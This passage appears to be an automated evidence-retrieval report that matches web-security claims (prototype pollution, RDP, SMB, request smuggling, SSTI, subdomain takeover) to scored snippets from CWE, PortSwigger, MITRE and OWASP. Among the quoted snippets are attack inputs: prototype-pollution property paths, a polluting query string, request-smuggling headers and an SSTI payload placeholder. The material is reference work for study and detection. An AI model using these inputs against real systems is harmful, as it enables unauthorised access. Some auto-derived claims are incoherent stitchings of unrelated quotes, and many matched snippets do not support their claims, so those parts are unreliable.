- score 6: (good code) Example Language: JavaScript function setValueByPath (object, path, value) { const pathArray = path.split("."); const attributeToSet = pathArray.pop(); let objectToModify = object; for (const attr of pathArray) { // Ignore attributes which resolve to object prototype if (attr === "__proto__" || attr === "constructor" || attr === "prototype") { continue; } if (typeof objectToModify[attr] !== "object") { objectToModify[attr] = {}; } objectToModify = objectToModify[attr]; } objectToModify[attributeToSet] = value; return object; }
  - overlap: `constructor, path, proto, prototype`
- score 6: CVE-2020-8203 Prototype pollution by setting object attributes based on dot-separated path.
  - overlap: `path, prototype`
- score 5: CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') (4.20) ID Lookup: Home About ▼ Who We Are User Stories History Documents Videos Learn ▼ Basics Root Cause Mapping ► Guidance Quick Tips Examples How to Contribute Weakness Content FAQs Glossary Access Content ▼ Top-N Lists ► Top 25 Software Top Hardware Top 10 KEV Weaknesses CWE List ► Current Version Reports Visualizations Releases Archive Downloads REST API Community ▼ News ► Current News Blog Podcast News Archive CWE Board Working Groups & Special Interest Groups Email Lists Search ▼ Search CWE List Search Website browserheight();
  - overlap: `prototype`
- score 5: Impact Details Read Application Data; Modify Application Data Scope: Confidentiality, Integrity, Availability Likelihood: High This weakness is usually exploited by using a special attribute of objects called proto, constructor, or prototype.
  - overlap: `constructor, proto, prototype`
- score 5: (bad code) Example Language: JavaScript setValueByPath({}, "__proto__.isAdmin", true) setValueByPath({}, "constructor.prototype.isAdmin", true) By using a denylist of dangerous attributes, this weakness can be eliminated.
  - overlap: `constructor, proto, prototype`

### portswigger.net — https://portswigger.net/web-security/prototype-pollution
status `ACTIVE`, 17189 chars
- score 10: objectLiteral.hasOwnProperty('__proto__'); // false objectFromJson.hasOwnProperty('__proto__'); // true If the object created via JSON.parse() is subsequently merged into an existing object without proper key sanitization, this will also lead to prototype pollution during the assignment, as we saw in the previous URL-based example .
  - overlap: `proto, prototype`
- score 9: The most common sources are as follows: The URL via either the query or fragment string (hash) JSON-based input Web messages Prototype pollution via the URL Consider the following URL, which contains an attacker-constructed query string: https://vulnerable-website.com/?__proto__[evilProperty]=payload When breaking the query string down into key:value pairs, a URL parser may interpret __proto__ as an arbitrary string.
  - overlap: `proto, prototype, string`
- score 8: At some point, the recursive merge operation may assign the value of evilProperty using a statement equivalent to the following: targetObject.__proto__.evilProperty = 'payload'; During this assignment, the JavaScript engine treats __proto__ as a getter for the prototype.
  - overlap: `proto, prototype`
- score 7: Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys.
  - overlap: `prototype`
- score 7: Due to the special meaning of __proto__ in a JavaScript context, the merge operation may assign the nested properties to the object's prototype instead of the target object itself.
  - overlap: `itself, proto, prototype`

## `prototype_pollution.prerequisite.untrusted_json_reaches_a_merge_sink`

**Claim:** Prototype pollution requires an untrusted JSON body or query object to reach a sink that merges, extends, clones or deep-assigns it into a server-side object; where user input is only read as a scalar and never merged, no payload can pollute Object.prototype.

### mitre.org — https://cwe.mitre.org/data/definitions/1321.html
status `ACTIVE`, 19144 chars
- score 8: CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') (4.20) ID Lookup: Home About ▼ Who We Are User Stories History Documents Videos Learn ▼ Basics Root Cause Mapping ► Guidance Quick Tips Examples How to Contribute Weakness Content FAQs Glossary Access Content ▼ Top-N Lists ► Top 25 Software Top Hardware Top 10 KEV Weaknesses CWE List ► Current Version Reports Visualizations Releases Archive Downloads REST API Community ▼ News ► Current News Blog Podcast News Archive CWE Board Working Groups & Special Interest Groups Email Lists Search ▼ Search CWE List Search Website browserheight();
  - overlap: `object, pollution, prototype, user`
- score 8: Phase Note Architecture and Design Implementation This weakness is often found in code that assigns object attributes based on user input, or merges or clones objects recursively.
  - overlap: `assigns, clones, input, merges, object, user`
- score 7: CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') (4.20) Common Weakness Enumeration Celebrating 20 years of community-developed cybersecurity weakness knowledge!
  - overlap: `object, pollution, prototype`
- score 7: div.collapseblock { display:inline} CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution') Weakness ID: 1321
  - overlap: `object, pollution, prototype`
- score 7: CVE-2019-10744 Prototype pollution by setting default values to object attributes recursively.
  - overlap: `object, pollution, prototype`

### portswigger.net — https://portswigger.net/web-security/prototype-pollution
status `ACTIVE`, 17189 chars
- score 13: objectLiteral.hasOwnProperty('__proto__'); // false objectFromJson.hasOwnProperty('__proto__'); // true If the object created via JSON.parse() is subsequently merged into an existing object without proper key sanitization, this will also lead to prototype pollution during the assignment, as we saw in the previous URL-based example .
  - overlap: `json, merged, object, pollution, prototype`
- score 12: The most common sources are as follows: The URL via either the query or fragment string (hash) JSON-based input Web messages Prototype pollution via the URL Consider the following URL, which contains an attacker-constructed query string: https://vulnerable-website.com/?__proto__[evilProperty]=payload When breaking the query string down into key:value pairs, a URL parser may interpret __proto__ as an arbitrary string.
  - overlap: `input, json, payload, pollution, prototype, query`
- score 11: Object inheritance Prototype chain Accessing an object's prototype Modifying prototypes How vulnerabilities arise Sources URL JSON input Sinks Gadgets Client-side prototype pollution Finding sources manually Finding sources using DOM Invader Finding gadgets manually Finding gadgets using DOM Invader Prototype pollution via the constructor Bypassing flawed key sanitization Prototype pollution in external libraries Prototype pollution via browser APIs fetch() method Object.defineProperty() method Server-side prototype pollution Why is server-side prototype pollution more difficult to detect?
  - overlap: `input, json, object, pollution, prototype, server, side`
- score 11: Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys.
  - overlap: `merges, object, pollution, prototype, user`
- score 9: Detecting via polluted property reflection Detecting without polluted property reflection Status code override JSON spaces override Charset override Scanning for sources Bypassing input filters Remote code execution Identifying a vulnerable request child_process.fork() method child_process.execSync() method Preventing vulnerabilities Sanitizing property keys Preventing changes to prototype objects Preventing an object from inheriting properties Using safer alternatives where possible View all prototype pollution labs Web Security Academy Prototype pollution What is prototype pollution?
  - overlap: `input, json, object, pollution, prototype`

## `rdp.prerequisite.dev-tunnel-publishes-internal-3389`

**Claim:** Microsoft dev tunnels can republish an internal host's port 3389 to the public internet on a devtunnels.ms hostname, so an RDP service only reachable inside a segment becomes internet-reachable without any firewall change.

### microsoft.com — https://learn.microsoft.com/en-us/windows/win32/termserv/remote-desktop-protocol
status `ACTIVE`, 9338 chars
- score 5: Remote Desktop Protocol Feedback Summarize this article for me In this article The Microsoft Remote Desktop Protocol (RDP) provides remote display and input capabilities over network connections for Windows-based applications running on a server.
  - overlap: `microsoft`
- score 4: Virtual channels By using RDP virtual channel architecture, existing applications can be augmented and new applications can be developed to add features that require communications between the client device and an application running in a remote desktop session.
  - overlap: ``
- score 3: Features Microsoft RDP includes the following features and capabilities: Encryption RDP uses RSA Security's RC4 cipher, a stream cipher designed to efficiently encrypt small amounts of data.
  - overlap: `microsoft`
- score 3: On the client, RDP receives rendering data and interprets the packets into corresponding Microsoft Windows graphics device interface (GDI) API calls.
  - overlap: `microsoft`
- score 2: RDP is a multiple-channel capable protocol that allows for separate virtual channels for carrying device communication and presentation data from the server, as well as encrypted client mouse and keyboard data.
  - overlap: ``

### mitre.org — https://attack.mitre.org/techniques/T1021/001/
status `ACTIVE`, 27415 chars
- score 6: Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). [1] Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials.
  - overlap: `microsoft, service`
- score 6: G0022 APT3 APT3 enables the Remote Desktop Protocol for persistence. [9] APT3 has also interacted with compromised systems to browse and copy files through RDP sessions. [10]
  - overlap: ``
- score 6: C0024 SolarWinds Compromise During the SolarWinds Compromise , APT29 used RDP sessions from public-facing systems to internal servers. [81]
  - overlap: `internal, public`
- score 6: S0030 Carbanak Carbanak enables concurrent Remote Desktop Protocol (RDP) sessions. [25]
  - overlap: ``
- score 4: Detection Strategy ID Name Analytic ID Analytic Description DET0327 Multi-event Detection Strategy for RDP-Based Remote Logins and Post-Access Activity AN0931 Remote Desktop (RDP) logon by a user followed by unusual process execution, file access, or lateral movement activity within a short timeframe.
  - overlap: ``

## `rdp.technique.rdp_reachable_is_access_reachable`

**Claim:** RDP provides remote display and input over a network connection and is designed for multiple topologies and LAN protocols, so reachability of an RDP listener is reachability of an interactive session on that host.

### microsoft.com — https://learn.microsoft.com/en-us/windows/win32/termserv/remote-desktop-protocol
status `ACTIVE`, 9338 chars
- score 9: Remote Desktop Protocol Feedback Summarize this article for me In this article The Microsoft Remote Desktop Protocol (RDP) provides remote display and input capabilities over network connections for Windows-based applications running on a server.
  - overlap: `display, input, network, provides, remote`
- score 7: RDP is designed to support different types of network topologies and multiple LAN protocols.
  - overlap: `designed, multiple, network, protocols, topologies`
- score 6: Virtual channels By using RDP virtual channel architecture, existing applications can be augmented and new applications can be developed to add features that require communications between the client device and an application running in a remote desktop session.
  - overlap: `remote, session`
- score 5: In a Remote Desktop session, all environment variables—for example, variables determining color depth and wallpaper enabling and disabling—are determined by the RCP-Tcp connection settings.
  - overlap: `connection, remote, session`
- score 5: Sharing input and display graphics between two remote desktop sessions gives a support person the ability to diagnose and resolve problems remotely.
  - overlap: `display, input, remote`

## `segmentation_analysis.technique.private_addressing_marks_the_boundary`

**Claim:** Private address space defines the internal boundary as a routing property — private addresses must not be propagated across inter-enterprise links — so segmentation claims are testable against forwarding behaviour rather than against policy documents.

### microsoft.com — https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/
status `ACTIVE`, 13458 chars
- score 2: Additionally, overview documents cover inter-protocol relationships and interactions.
  - overlap: `documents, inter`
- score 1: Certain Open Specifications documents are intended for use in conjunction with publicly available standards specifications and network programming art and, as such, assume that the reader either is familiar with the aforementioned material or has immediate access to it.
  - overlap: `documents`
- score 1: The example companies, organizations, products, domain names, email addresses, logos, people, places, and events that are depicted in this documentation are fictitious.
  - overlap: `addresses`
- score 1: No association with any real company, organization, product, domain name, email address, logo, person, place, or event is intended or should be inferred.
  - overlap: `address`
- score 1: The names of companies and products contained in this documentation might be covered by trademarks or similar intellectual property rights.
  - overlap: `property`

### mitre.org — https://attack.mitre.org/tactics/TA0005/
status `ACTIVE`, 74904 chars
- score 2: For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt).
  - overlap: `defines, documents`
- score 2: Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails.
  - overlap: ``
- score 2: Rules may be created or modified within email clients or through external features such as the New-InboxRule or Set-InboxRule PowerShell cmdlets on Windows systems.
  - overlap: ``
- score 2: After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.
  - overlap: ``
- score 2: After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.
  - overlap: ``

## `smb.fp_rule.netsh-portproxy-and-lotw-smb-are-built-in-features`

**Claim:** SMB traffic originating from a built-in Windows redirection feature or a living-off-the-land tooling pattern is a lookalike and is legitimately not attacker-driven pivoting.

### microsoft.com — https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/
status `ACTIVE`, 14582 chars
- score 4: You can try changing directories . [MS-SMB2]: Server Message Block (SMB) Protocol Versions 2 and 3 Feedback Summarize this article for me In this article Specifies the Server Message Block (SMB) Protocol Versions 2 and 3, which support the sharing of file and print resources between machines and extend the concepts from the Server Message Block Protocol.
  - overlap: ``
- score 4: [MS-SMB2]: Server Message Block (SMB) Protocol Versions 2 and 3 | Microsoft Learn
  - overlap: ``
- score 1: Published Version Date Protocol Revision Revision Class Downloads 9/28/2026 88.0 Major PDF | DOCX Click here to download a zip file of all PDF files for Windows Protocols.
  - overlap: `windows`
- score 1: A preview version of this document may be available on the Windows Protocols - Preview Documents page.
  - overlap: `windows`

### mitre.org — https://attack.mitre.org/techniques/T1021/002/
status `ACTIVE`, 28518 chars
- score 5: Other sub-techniques of Remote Services (8) ID Name T1021.001 Remote Desktop Protocol T1021.002 SMB/Windows Admin Shares T1021.003 Distributed Component Object Model T1021.004 SSH T1021.005 VNC T1021.006 Windows Remote Management T1021.007 Cloud Services T1021.008 Direct Cloud VM Connections
  - overlap: `windows`
- score 5: G0096 APT41 APT41 has transferred implant files using Windows Admin Shares and the Server Message Block (SMB) protocol, then executes files through Windows Management Instrumentation (WMI). [11] [12]
  - overlap: `windows`
- score 5: S0056 Net Crawler Net Crawler uses Windows admin shares to establish authenticated sessions to remote systems over SMB as part of lateral movement. [58]
  - overlap: `windows`
- score 5: Home Techniques Enterprise Remote Services SMB/Windows Admin Shares Remote Services: SMB/Windows Admin Shares
  - overlap: `windows`
- score 5: Remote Services: SMB/Windows Admin Shares, Sub-technique T1021.002 - Enterprise | MITRE ATT&CK®
  - overlap: `windows`

### rfc-editor.org — https://www.rfc-editor.org/rfc/rfc1002.html
status `ACTIVE`, 104456 chars
- score 2: /* * a name in the state "conflict detected" * does not "logically" exist on that node. * No further session will be accepted on * that name. * No datagrams can be sent against that name. * Such an entry will not be used for * purposes of processing incoming request * packets. * The only valid user NetBIOS operation * against such a name is DELETE NAME. */ END NAME RELEASE REQUEST: IF caching is being done THEN BEGIN remove entry from cache; END NAME UPDATE REQUEST: IF caching is being done THEN BEGIN IF entry exists in cache already, update cache; ELSE IF name is "interesting" THEN BEGIN add entry to cache; END END
  - overlap: ``
- score 2: IF (group == TRUE) OR (NetBIOS broadcast) THEN BEGIN /* * Sending of following query is optional. * Node may send datagram to NBDD immediately * but NBDD may discard the datagram. */ send DATAGRAM QUERY REQUEST to NBDD; IF response is POSITIVE QUERY RESPONSE THEN send UDP packet(s) to NBDD Server IP address; ELSE BEGIN get list of destination nodes from NBNS;
  - overlap: ``
- score 2: Replicate NetBIOS Datagram header from 1st UDP packet into 2nd UDP packet; Put rest of data in 2nd UDP packet; Clear MORE and FIRST bits in 2nd UDP packet's FLAGS; OFFSET in 2nd UDP = DGM_LENGTH - number of name and data bytes in 1st UDP; END BEGIN /* * Only need one UDP packet */ USER_DATA = data; Clear MORE bit and set FIRST bit in FLAGS; OFFSET = 0; END
  - overlap: ``
- score 2: 1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | | +--- ---+ | | +--- NETBIOS FORMAT NAME ---+ | | +--- ---+ | | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | NAME_FLAGS | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
  - overlap: ``
- score 2: IF this is a P or M node THEN BEGIN /* * Inform NetBIOS Name Server * it has returned incorrect * information. */ send NAME RELEASE REQUEST for called name and IP address to NetBIOS Name Server; END /* retry from beginning */ retarget = FALSE; name_query = TRUE; goto LOOP; END /* called name not present */ END /* case */ END /* negative response */
  - overlap: ``

## `smuggling.evidence.reject_a_smuggling_finding_until_it_is_disti`

**Claim:** A convincing observation for this class is: Adjacent behaviour that produces the same observable result: It basically enables you to hide a payload in plain sight.

### mitre.org — https://cwe.mitre.org/data/definitions/444.html
status `ACTIVE`, 30191 chars
- score 6: CVE-2005-2088 HTTP server allows request smuggling with both a "Transfer-Encoding: chunked" header and a Content-Length header CVE-2005-2089 HTTP server allows request smuggling with both a "Transfer-Encoding: chunked" header and a Content-Length header
  - overlap: ``
- score 6: Notes Theoretical Request smuggling can be performed due to a multiple interpretation error, where the target is an intermediary or monitor, via a consistency manipulation (Transfer-Encoding and Content-Length headers).
  - overlap: ``
- score 6: 2020-10-15. https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling >. [REF-1276] Edi Kogan and Daniel Kerman. "HTTP Desync Attacks in the Wild and How to Defend Against Them".
  - overlap: ``
- score 6: ( URL validated: 2025-08-04 ) [REF-1277] James Kettle. "HTTP Desync Attacks: Request Smuggling Reborn".
  - overlap: ``
- score 6: 2019-08-07. https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn >.
  - overlap: ``

### portswigger.net — https://portswigger.net/web-security/request-smuggling
status `ACTIVE`, 23981 chars
- score 6: How to perform an HTTP request smuggling attack Classic request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP/1 request and manipulating these so that the front-end and back-end servers process the request differently.
  - overlap: ``
- score 6: For details, check out the following whitepapers: HTTP desync attacks: Request smuggling reborn HTTP/2: The sequel is always worse Browser-powered desync attacks: A new frontier in HTTP request smuggling What happens in an HTTP request smuggling attack?
  - overlap: ``
- score 6: Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.
  - overlap: ``
- score 6: We can perform a simple HTTP request smuggling attack as follows: POST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 13 Transfer-Encoding: chunked
  - overlap: ``
- score 6: We can perform a simple HTTP request smuggling attack as follows: POST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 3 Transfer-Encoding: chunked
  - overlap: ``

## `smuggling.fp_rule.auto.derived`

**Claim:** Reject a smuggling finding until it is distinguished from the adjacent behaviour this class also covers. "Requests to appliance administrative asset paths act as an early reconnaissance fingerprint for exploitation, and the repetition of an otherwise mundane static-path request from changing infrastructure is itself the signal." and "It basically enables you to hide a payload in plain sight." share a surface and a symptom, so a response that matches the first is not evidence for it while the second remains possible.

### mitre.org — https://cwe.mitre.org/data/definitions/444.html
status `ACTIVE`, 30191 chars
- score 8: CVE-2005-2088 HTTP server allows request smuggling with both a "Transfer-Encoding: chunked" header and a Content-Length header CVE-2005-2089 HTTP server allows request smuggling with both a "Transfer-Encoding: chunked" header and a Content-Length header
  - overlap: `request, smuggling`
- score 8: Notes Theoretical Request smuggling can be performed due to a multiple interpretation error, where the target is an intermediary or monitor, via a consistency manipulation (Transfer-Encoding and Content-Length headers).
  - overlap: `request, smuggling`
- score 8: 2020-10-15. https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling >. [REF-1276] Edi Kogan and Daniel Kerman. "HTTP Desync Attacks in the Wild and How to Defend Against Them".
  - overlap: `request, smuggling`
- score 8: ( URL validated: 2025-08-04 ) [REF-1277] James Kettle. "HTTP Desync Attacks: Request Smuggling Reborn".
  - overlap: `request, smuggling`
- score 8: 2019-08-07. https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn >.
  - overlap: `request, smuggling`

### portswigger.net — https://portswigger.net/web-security/request-smuggling
status `ACTIVE`, 23981 chars
- score 8: How to perform an HTTP request smuggling attack Classic request smuggling attacks involve placing both the Content-Length header and the Transfer-Encoding header into a single HTTP/1 request and manipulating these so that the front-end and back-end servers process the request differently.
  - overlap: `request, smuggling`
- score 8: For details, check out the following whitepapers: HTTP desync attacks: Request smuggling reborn HTTP/2: The sequel is always worse Browser-powered desync attacks: A new frontier in HTTP request smuggling What happens in an HTTP request smuggling attack?
  - overlap: `request, smuggling`
- score 8: Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.
  - overlap: `request, smuggling`
- score 8: We can perform a simple HTTP request smuggling attack as follows: POST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 13 Transfer-Encoding: chunked
  - overlap: `request, smuggling`
- score 8: We can perform a simple HTTP request smuggling attack as follows: POST / HTTP/1.1 Host: vulnerable-website.com Content-Length: 3 Transfer-Encoding: chunked
  - overlap: `request, smuggling`

## `ssti.evidence.a_dns_callback_received_after_an_ssti_payloa`

**Claim:** A convincing observation for this class is: The finding survives only when the callback is a record type your template expression would have caused, such as an SRV query from an nslookup call embedded in the expression, or when the resolved payload string appears in the response body so you can attribute the lookup to template evaluation.

### mitre.org — https://cwe.mitre.org/data/definitions/1336.html
status `ACTIVE`, 18240 chars
- score 9: Alternate Terms Server-Side Template Injection / SSTI This term is used for injection into template engines being used by a server.
  - overlap: `template`
- score 5: Reference Description CVE-2024-34359 Chain: Python bindings for LLM library do not use a sandboxed environment when parsing a template and constructing a prompt, allowing jinja2 Server Side Template Injection and code execution - one variant of a "prompt injection" attack.
  - overlap: `template`
- score 5: ( URL validated: 2023-04-07 ) [REF-1194] James Kettle. "Server-Side Template Injection: RCE For The Modern Web App".
  - overlap: `template`
- score 5: Client-Side Template Injection / CSTI This term is used for injection into template engines being used by a client.
  - overlap: `template`
- score 5: 2015-08-05. https://portswigger.net/research/server-side-template-injection >.
  - overlap: `template`

### portswigger.net — https://portswigger.net/web-security/server-side-template-injection
status `ACTIVE`, 19912 chars
- score 7: As template syntax is evaluated server-side, this potentially allows an attacker to place a server-side template injection payload inside the name parameter as follows: http://vulnerable-website.com/?name={{bad-stuff-here}} Vulnerabilities like this are sometimes caused by accident due to poor template design by people unfamiliar with the security implications.
  - overlap: `caused, payload, template`
- score 7: The classic example is an email that greets each user by their name, such as the following extract from a Twig template: $output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) ); This is not vulnerable to server-side template injection because the user's first name is merely passed into the template as data.
  - overlap: `template`
- score 7: Alternatively, if the output is rendered correctly, along with the arbitrary HTML, this is a key indication that a server-side template injection vulnerability is present: Hello Carlos Identify Once you have detected the template injection potential, the next step is to identify the template engine.
  - overlap: `template`
- score 7: One of the simplest ways to avoid introducing server-side template injection vulnerabilities is to always use a "logic-less" template engine, such as Mustache, unless absolutely necessary.
  - overlap: `template`
- score 7: Server-side template injection vulnerabilities can expose websites to a variety of attacks depending on the template engine in question and how exactly the application uses it.
  - overlap: `template`

## `ssti.test.a_dns_callback_received_after_an_ssti_payload_is`

**Claim:** To decide this case, observe: Discard the SSTI report when the only signal is a bare DNS resolution for your OAST domain, because recursive resolvers, prefetchers, mail scanners, and your own tooling generate ordinary lookups that land on the same listener.

### mitre.org — https://cwe.mitre.org/data/definitions/1336.html
status `ACTIVE`, 18240 chars
- score 9: Alternate Terms Server-Side Template Injection / SSTI This term is used for injection into template engines being used by a server.
  - overlap: `ssti`
- score 4: Reference Description CVE-2024-34359 Chain: Python bindings for LLM library do not use a sandboxed environment when parsing a template and constructing a prompt, allowing jinja2 Server Side Template Injection and code execution - one variant of a "prompt injection" attack.
  - overlap: ``
- score 4: ( URL validated: 2023-04-07 ) [REF-1194] James Kettle. "Server-Side Template Injection: RCE For The Modern Web App".
  - overlap: ``
- score 4: Client-Side Template Injection / CSTI This term is used for injection into template engines being used by a client.
  - overlap: ``
- score 4: 2015-08-05. https://portswigger.net/research/server-side-template-injection >.
  - overlap: ``

### portswigger.net — https://portswigger.net/web-security/server-side-template-injection
status `ACTIVE`, 19912 chars
- score 6: The classic example is an email that greets each user by their name, such as the following extract from a Twig template: $output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) ); This is not vulnerable to server-side template injection because the user's first name is merely passed into the template as data.
  - overlap: ``
- score 6: Alternatively, if the output is rendered correctly, along with the arbitrary HTML, this is a key indication that a server-side template injection vulnerability is present: Hello Carlos Identify Once you have detected the template injection potential, the next step is to identify the template engine.
  - overlap: ``
- score 6: One of the simplest ways to avoid introducing server-side template injection vulnerabilities is to always use a "logic-less" template engine, such as Mustache, unless absolutely necessary.
  - overlap: ``
- score 6: Server-side template injection vulnerabilities can expose websites to a variety of attacks depending on the template engine in question and how exactly the application uses it.
  - overlap: ``
- score 4: Find server-side template injection vulnerabilities using Burp Suite Try for free Burp Suite Web vulnerability scanner Burp Suite Editions Release Notes Vulnerabilities Cross-site scripting (XSS) SQL injection Cross-site request forgery XML external entity injection Directory traversal Server-side request forgery Customers Organizations Testers Developers Company About Careers Contact Legal Privacy Notice Modern Slavery Statement Insights Web Security Academy Blog Research Follow us © 2026 PortSwigger Ltd.
  - overlap: ``

## `subdomain_takeover.auto.01`

**Claim:** This often happens because the subdomain's DNS record hasn't been properly de-provisioned or points to a service that is no longer in use.

### mitre.org — https://cwe.mitre.org/data/definitions/404.html
status `ACTIVE`, 38422 chars
- score 2: Taxonomy Mappings Mapped Taxonomy Name Node ID Fit Mapped Node Name PLOVER Improper resource shutdown or release 7 Pernicious Kingdoms Unreleased Resource OWASP Top Ten 2004 A9 CWE More Specific Denial of Service CERT C Secure Coding FIO42-C CWE More Abstract Close files when they are no longer needed CERT C Secure Coding MEM31-C CWE More Abstract Free dynamically allocated memory when no longer needed The CERT Oracle Secure Coding Standard for Java (2011) FIO04-J Release resources when they are no longer needed Software Fault Patterns SFP14 Failure to release resource
  - overlap: `longer, service`
- score 2: 1266 Improper Scrubbing of Sensitive Data from Decommissioned Device PeerOf Variant - a weakness that is linked to a certain type of product, typically involving a specific language or technology.
  - overlap: ``
- score 2: If this happens often enough, the database will run out of available cursors and not be able to execute any more SQL queries.
  - overlap: `happens, often`
- score 1: Impact Details DoS: Resource Consumption (Other); Varies by Context Scope: Availability, Other Most unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker might be able to launch a denial of service attack by depleting the resource pool.
  - overlap: `service`
- score 1: Extended Description When a resource is created or allocated, the developer is responsible for properly releasing the resource as well as accounting for all potential paths of expiration or invalidation, such as a set period of time or revocation.
  - overlap: `properly`

### owasp.org — https://cheatsheetseries.owasp.org/cheatsheets/Subdomain_Takeover_Prevention_Cheat_Sheet.html
status `ACTIVE`, 36257 chars
- score 13: Subdomain Takeover Prevention Cheat Sheet ¶ Introduction ¶ Subdomain takeover is a vulnerability that occurs when a DNS record (typically a CNAME) points to a cloud resource or third-party service that has been deprovisioned or no longer exists.
  - overlap: `longer, points, record, service, subdomain`
- score 12: How Subdomain Takeover Works ¶ The Basic Mechanism ¶ An organization creates a DNS record: blog.example.com CNAME example-blog.herokuapp.com The Heroku app serves content on blog.example.com Months later, the team decommissions the Heroku app but forgets to remove the DNS record The CNAME still points to example-blog.herokuapp.com , which no longer exists An attacker creates a new Heroku app with the name example-blog and claims the hostname The attacker now controls what is served on blog.example.com Why It Keeps Happening ¶ The root cause is almost always a disconnect between infrastructure provisioning and DNS management: Cloud resources are temporary, DNS records are persistent.
  - overlap: `longer, points, record, subdomain`
- score 9: Table of contents Introduction How Subdomain Takeover Works The Basic Mechanism Why It Keeps Happening Record Types at Risk Cloud Provider Vulnerability Reference High Risk: Takeover Possible When Resource Is Removed Conditional Risk: Takeover Possible Under Specific Circumstances Service Fingerprints for Detection Prevention Strategies 1.
  - overlap: `record, service, subdomain`
- score 9: Table of contents Introduction How Subdomain Takeover Works The Basic Mechanism Why It Keeps Happening Record Types at Risk Cloud Provider Vulnerability Reference High Risk: Takeover Possible When Resource Is Removed Conditional Risk: Takeover Possible Under Specific Circumstances Service Fingerprints for Detection Prevention Strategies 1.
  - overlap: `record, service, subdomain`
- score 9: Service Fingerprints for Detection ¶ When scanning for potential subdomain takeovers, look for these distinctive error responses that indicate the backend resource no longer exists: Service Error Response Pattern AWS S3 NoSuchBucket , The specified bucket does not exist GitHub Pages There isn't a GitHub Pages site here.
  - overlap: `longer, service, subdomain`

## `subdomain_takeover.auto.02`

**Claim:** The takeover is usually only considered severe if it compromises other systems or gives direct access to user data (such as cookies).

### mitre.org — https://cwe.mitre.org/data/definitions/404.html
status `ACTIVE`, 38422 chars
- score 3: 1266 Improper Scrubbing of Sensitive Data from Decommissioned Device PeerOf Variant - a weakness that is linked to a certain type of product, typically involving a specific language or technology.
  - overlap: `data`
- score 2: CWE-404: Improper Resource Shutdown or Release (4.20) ID Lookup: Home About ▼ Who We Are User Stories History Documents Videos Learn ▼ Basics Root Cause Mapping ► Guidance Quick Tips Examples How to Contribute Weakness Content FAQs Glossary Access Content ▼ Top-N Lists ► Top 25 Software Top Hardware Top 10 KEV Weaknesses CWE List ► Current Version Reports Visualizations Releases Archive Downloads REST API Community ▼ News ► Current News Blog Podcast News Archive CWE Board Working Groups & Special Interest Groups Email Lists Search ▼ Search CWE List Search Website browserheight();
  - overlap: `access, user`
- score 1: Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.) Effectiveness: High
  - overlap: `data`
- score 1: 775 Missing Release of File Descriptor or Handle after Effective Lifetime Relevant to the view "CISQ Data Protection Measures" (View-1340) Nature Type ID Name ParentOf Variant - a weakness that is linked to a certain type of product, typically involving a specific language or technology.
  - overlap: `data`
- score 1: Department of Homeland Security (DHS) Cybersecurity and Infrastructure Security Agency (CISA) and managed by the Homeland Security Systems Engineering and Development Institute (HSSEDI) which is operated by The MITRE Corporation (MITRE).
  - overlap: `systems`

### owasp.org — https://cheatsheetseries.owasp.org/cheatsheets/Subdomain_Takeover_Prevention_Cheat_Sheet.html
status `ACTIVE`, 36257 chars
- score 9: How Subdomain Takeover Works ¶ The Basic Mechanism ¶ An organization creates a DNS record: blog.example.com CNAME example-blog.herokuapp.com The Heroku app serves content on blog.example.com Months later, the team decommissions the Heroku app but forgets to remove the DNS record The CNAME still points to example-blog.herokuapp.com , which no longer exists An attacker creates a new Heroku app with the name example-blog and claims the hostname The attacker now controls what is served on blog.example.com Why It Keeps Happening ¶ The root cause is almost always a disconnect between infrastructure provisioning and DNS management: Cloud resources are temporary, DNS records are persistent.
  - overlap: `takeover`
- score 9: Subdomain Takeover Prevention Cheat Sheet ¶ Introduction ¶ Subdomain takeover is a vulnerability that occurs when a DNS record (typically a CNAME) points to a cloud resource or third-party service that has been deprovisioned or no longer exists.
  - overlap: `takeover`
